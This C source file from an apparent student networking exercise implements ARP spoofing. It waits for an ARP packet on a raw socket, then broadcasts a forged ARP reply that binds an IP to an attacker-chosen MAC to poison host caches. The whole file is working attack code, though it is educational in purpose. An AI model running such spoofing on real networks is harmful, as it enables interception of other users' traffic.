/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   malcolm.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
/*   Updated: 2025/11/26 10:31:05 by nponchon         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/ft_malcolm.h"

extern int g_sigint;

void	set_replypacket(t_malcolm *m, unsigned char *packet, unsigned char *src, unsigned char *tgt)
{
	struct ether_header eth;
	ft_memcpy(eth.ether_shost, src, 6);
	ft_memcpy(eth.ether_dhost, tgt, 6);
	eth.ether_type = htons(ETH_P_ARP);

	struct ether_arp arp;
	arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp.ea_hdr.ar_pro = htons(ETH_P_IP);
	arp.ea_hdr.ar_hln = 6;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
	ft_memcpy(arp.arp_sha, src, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
	ft_memcpy(arp.arp_tha, src, 6);
	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);

	ft_memcpy(packet, &eth, sizeof(eth));
	ft_memcpy(packet + sizeof(eth), &arp, sizeof(arp));
}

void	send_arp(t_malcolm *m)
{
	int ifindex = if_nametoindex("eth0");
	if (ifindex == 0) {
		fprintf(stderr, "Error: sendto failed\n");
		return;
	}

	unsigned char src_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	set_sourcemac(m, src_mac);
	// broadcast ARP to force a cache update on the target (has more authority)
	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	set_replypacket(m, packet, src_mac, broadcast_mac);

	struct sockaddr_ll sll = {0};
	sll.sll_ifindex = ifindex;
	sll.sll_halen = 6;
	ft_memcpy(sll.sll_addr, broadcast_mac, 6);

	ssize_t bytes_sent = sendto(m->socket, packet, sizeof(packet), 0, (struct sockaddr*)&sll, sizeof(sll));
	if (bytes_sent < 0) {
		fprintf(stderr, "Error: sendto failed\n");
	} else {
		if (m->verbose)
			print_arp(packet);
		printf("Reply packet sent, exiting.\n");
	}
}

int	listen_arp(t_malcolm *m)
{
	set_socket(m);

    unsigned char buf[65536];
    struct sockaddr_ll addr;
    socklen_t addrlen = sizeof(addr);

    ft_printf("Listening for packets between A and B...\n");

    while (g_sigint == 0) {
        ssize_t len = recvfrom(m->socket, buf, sizeof(buf), 0,
                            (struct sockaddr*)&addr, &addrlen);
        if (len < 0)
			continue;
        struct ether_header *eth = (struct ether_header*)buf;
        if (ntohs(eth->ether_type) == ETH_P_ARP) 
			break;
    }

	if (g_sigint) // exit on Ctrl+C
		return (0);

	if (m->verbose)
		print_arp(buf);

	send_arp(m);

    return (0);
}
